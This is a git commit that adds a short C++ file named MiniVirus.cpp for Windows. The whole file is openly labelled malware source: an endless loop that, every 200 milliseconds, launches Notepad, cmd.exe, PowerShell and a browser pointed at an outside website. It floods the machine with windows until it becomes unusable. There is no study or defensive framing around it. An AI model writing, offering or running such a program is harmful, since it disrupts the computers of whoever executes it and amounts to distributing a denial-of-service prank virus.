6673e5f1ead7a01ccbaee3c61f835bdc3c8edce4
gitJacobF <114739492+gitJacobF@users.noreply.github.com>
2022-11-14 16:50:46 +0100

    Add files via upload

---
+++ MiniVirus.cpp
@@ -0,0 +1,13 @@
+﻿#include <Windows.h>
+
+int main()
+{
+    while (true)
+    {
+        Sleep(200);
+        ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOWDEFAULT);
+        ShellExecuteA(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT);
+        ShellExecuteA(NULL, "open", "https://alesuperstrona.5v.pl", NULL, NULL, SW_SHOWDEFAULT);
+        ShellExecuteA(NULL, "open", "powershell.exe", NULL, NULL, SW_SHOWDEFAULT);
+    }
+}
